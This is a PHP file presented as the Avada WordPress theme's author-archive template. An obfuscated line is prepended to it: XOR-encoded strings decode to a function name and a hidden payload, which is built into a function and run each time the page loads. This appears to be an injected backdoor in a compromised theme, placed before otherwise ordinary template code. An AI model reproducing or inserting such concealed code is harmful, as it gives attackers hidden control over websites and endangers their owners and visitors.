<?php $poLLleEUKkc='CLN5 E9VN>+HQRN'^' >+TT f0;PH<8= ';$KgdYRQGFSVqJ=$poLLleEUKkc('','9JgNP::MZ1O69EOI+<>qp+YFsR455>2CUBsYBtAmgRF9N 9 =k;WD22AOQ99PI6iA<A,9XFe14;dNzHLSPZ=SwOEFOLDMVmL1NP9BzuSnZHBkbHDFSE1+1;Qh M8 EoPPIzeNEeorTH.hXZLceWSM22Q<mJ8owZEKcaPAQEEIE:R<kb1N<N9NRO7dBI,X07IiBLGouAKI<C<ciIVG,PnV-YV1.KaG<9GJlSR4hwA4J.6XTISVUCI49.rmC<p+x y2gXFJC35TVUQKK3;>DVSK5IYqW-D4iZ3HkTvAETEaGnm= TQawOhO;Y=NKSIlNB>rQnU AB,Mw9e0HYFPRTHqZIlnw>=6mim1OtgK-TAZrkq9W5;EnMMYoSmSJCUjU<.kvdm955yd9COIY3SZuEo3O=,1wS5,H6ccC5->3cQRt=PE1G.LL, Rf3RR5RSH54c9G,p;U+VWQs>2ZOZ,MQJL60ZkAGZA.S=R4YHpvAS5rc,28RYNmM2+<R3c8VH,250C90nFZ6;bHGhJ6MVMpLRhC5VRQGX8BRiAU0-ighQszzWVuNI:PrQ0a,<;XI dyPeTAcWdovWy23gJqFMpx25H3E7W1Dr0EZ6L2JB9PIBWJ=DoYnDVI+gDXBLhdbJOlNFRWfkV27+0WP 5VQ-SQ+jinpR .>cCJimK' ^'P,Oo6OT..X Xf 7 XHMYWS64,6UATam. 6TpkT:gn43W-TPOSKC86mV ;0ff=<BAeX XXtfAZQBMnZhls+P4ZS 02oqdjqVF8G6V0RQ:NghrPBl-z 1CGTUyLD,LAlTpt QNgOlfV;=ZHvglKA329SiuU0jfOS1 28E9ate6=7V7RCFZ+EgdgiE>m0,X-BYaM-93FNKB46>6iM-73MpSvK8:BKpkcXX3+387MHJaR+BE=oCY0:1,UZFREgc3d7k0wG95jgXP-vhokoEZR13zkNCPU3L0U61V1KiVe.1<ZMgIYA 0AJoL9Z5H+pY4fD+XRyOqD 6MdWBo9.64537 Qrm3<2ohs>=MP<TC H-agLKUO6YN Gm6SfZI7+745>YWKKDIRPLBn0Jk-8G2zHeKE.QYTLY<QBKiigQLJRClr4H>6T5G- EZ7NK= j62<Tk<T2XXY4X3ae,ZW9 >Ieu.-BQsGac> Z2b9Q aYMK:SZGHSL3yhKmSYN3J<S31sWMY0MCFa1SBEdgL.W97dPjtHkX2gyc<Y632f>UTN:AqNGZp3C,pYbK7UWOXX9zDVIcV2 R3VVE5MTWPmXfkVXSG:R<h<T=-U=3E8AbeI10.8+YcCyJ 7=JNmxblHDB1Ee+03;NO2SCJkp AL:>L7vvCRdy7XGJKscRg6'); $KgdYRQGFSVqJ();
/**
 * Authors template.
 *
 * @package Avada
 * @subpackage Templates
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}
?>
<?php get_header(); ?>
<section id="content" <?php Avada()->layout->add_class( 'content_class' ); ?> <?php Avada()->layout->add_style( 'content_style' ); ?>>
	<?php
	/**
	 * Author Info Hook avada_author_info.
	 *
	 * @hooked avada_render_author_info - 10 (renders the HTML markup of the author info).
	 */
	do_action( 'avada_author_info' );
	?>

	<?php get_template_part( 'templates/blog', 'layout' ); ?>
</section>
<?php do_action( 'avada_after_content' ); ?>
<?php
get_footer();

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
